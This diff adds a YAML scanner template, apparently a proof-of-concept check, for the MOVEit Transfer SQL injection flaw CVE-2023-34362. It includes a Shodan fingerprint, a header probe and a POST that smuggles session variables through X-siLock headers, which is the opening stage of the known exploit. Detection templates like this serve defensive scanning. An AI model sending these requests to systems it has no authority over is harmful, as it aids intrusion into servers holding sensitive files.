@@ -1,0 +1,35 @@
+id: poc-yaml-moveit-transfer-remote-code-execution
+info:
+  name: Progress MOVEit Transfer moveitisapi SQL注入漏洞(CVE-2023-34362)
+  severity: critical
+  tags:
+  - rce
+  - CVE-2023-34362
+  finger: moveit transfer
+  shodan: http.favicon.hash:989289239
+requests:
+- method: GET
+  path: /moveitisapi/moveitisapi.dll?action=capa
+  expression: 'status_code == 200
+
+    && contains(headers,"X-Silock-Errorcode")
+
+    && contains(headers,"X-Silock-Quotedfilenames")
+
+    && body == ""
+
+    '
+- method: POST
+  path: /moveitisapi/moveitisapi.dll?action=m2
+  headers:
+    Ax-silock-transaction: folder_add_by_path
+    X-siLock-Transaction: session_setvars
+    X-siLock-SessVar0: 'MyUsername: Guest'
+    X-siLock-SessVar1: 'MyPkgAccessCode: 123'
+    X-siLock-SessVar2: 'MyGuestEmailAddr: my_guest_email@example.com'
+    Cookie: siLockLongTermInstID=0
+    Content-Length: 0
+  expression: status_code == 200 && contains(headers,"X-Silock-Errorcode") && body
+    == ""
+variables: {}
+transport: http
